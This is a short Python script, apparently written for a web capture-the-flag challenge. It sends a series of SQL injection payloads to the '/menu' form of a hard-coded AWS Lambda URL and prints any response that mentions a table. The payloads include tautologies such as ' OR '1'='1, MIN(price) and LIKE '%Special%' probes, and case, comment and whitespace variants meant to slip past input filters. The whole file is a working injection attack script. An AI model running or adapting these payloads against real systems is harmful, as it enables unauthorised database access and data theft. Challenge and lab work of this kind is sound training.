import requests

def test_injection(url, payload):
    """
    Send SQL injection payload and return the response
    """
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://2rjg3a6m46nvm4lsdjdqbtczjy0fasoe.lambda-url.us-east-2.on.aws',
        'Referer': 'https://2rjg3a6m46nvm4lsdjdqbtczjy0fasoe.lambda-url.us-east-2.on.aws/menu'
    }
    
    data = {'query': payload}
    response = requests.post(url + '/menu', headers=headers, data=data)
    print(f"Trying: {payload}")
    print(f"Response length: {len(response.text)}")
    if "table" in response.text.lower():
        print("Found results!")
        print(response.text)
    return response.text

def main():
    base_url = "https://2rjg3a6m46nvm4lsdjdqbtczjy0fasoe.lambda-url.us-east-2.on.aws"
    
    # Since min is mentioned in the challenge
    min_payloads = [
        "' OR MIN(price)>0 -- ",
        "' OR price=MIN(price) -- ",
        "' AND price=(SELECT MIN(price)) -- ",
        "' HAVING MIN(price)>0 -- ",
        "' GROUP BY price HAVING MIN(price)>0 -- "
    ]
    
    # Since special is mentioned
    special_payloads = [
        "' OR category LIKE '%Special%' -- ",
        "' OR dish LIKE '%Special%' -- ",
        "' OR category='Special' -- ",
        "' OR dish='Special' -- "
    ]
    
    # Try case variations (to bypass filters)
    case_payloads = [
        "' oR '1'='1",
        "' Or '1'='1",
        "' OR '1' = '1",
        "' OR/**/1=1 -- ",
        "' OR\n1=1 -- ",
        "' OR\t1=1 -- "
    ]
    
    # All payloads combined
    all_payloads = min_payloads + special_payloads + case_payloads
    
    for payload in all_payloads:
        test_injection(base_url, payload)

if __name__ == "__main__":
    main()